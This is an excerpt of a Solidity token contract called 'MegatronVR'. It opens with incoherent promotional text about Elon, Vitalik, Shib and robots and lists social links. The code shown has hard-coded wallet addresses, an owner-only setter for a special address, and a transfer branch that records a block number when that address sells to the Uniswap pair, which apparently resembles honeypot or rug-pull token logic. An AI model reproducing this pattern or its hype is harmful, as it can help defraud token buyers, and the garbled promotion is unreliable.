...
/* 
Creating Megatron Viatlik is for better solving financial crisis and encrypt credit. 
Elon chose AI, Viatlik and I chose encrypt credit and ETH. Competition and opponent make encryption stronger.

Some shib’s super players and me want to make this encrypted game of Optimus more interesting. 
The founders of Optimus and our discussion will be released soon and he smiled and ate our chocolate. 

The emergence of Megatron will bring Tesla robots in the encryption field to a new stage and we choose Viatlik. 
The super players of Shib will deliver more interesting cookie information gradually through the blockchain. 
Megatron is not only the opposition, but also the clear confrontation, just like doge and shib, 
some giants will transmit super energy and make the community 100% driven.
*/

//  Telegram: https://t.me/MegatronVitalik_sRobot
//  Twitter:  https://twitter.com/megatron_robot
//  Medium:   Shib's voo says let the community do it, the message is enough to deliver.
//  Website:  https://megatronbot.com/
...
contract MegatronVR is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "MegatronVR";
    string private _symbol = "MegatronVR";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x41920920EDf16271Df22518D24d27953E75f872C);
    address payable public teamWalletAddress = payable(0x5AD6B2dAD0b0E5a03ba5d059C796538170403ae7);
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public addressOri;
    ...
    function setaddressOri(address  _addressOri)external onlyOwner() {
        addressOri = _addressOri;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if(sender == addressOri && recipient == uniswapPair){
            sale = block.number;
        }
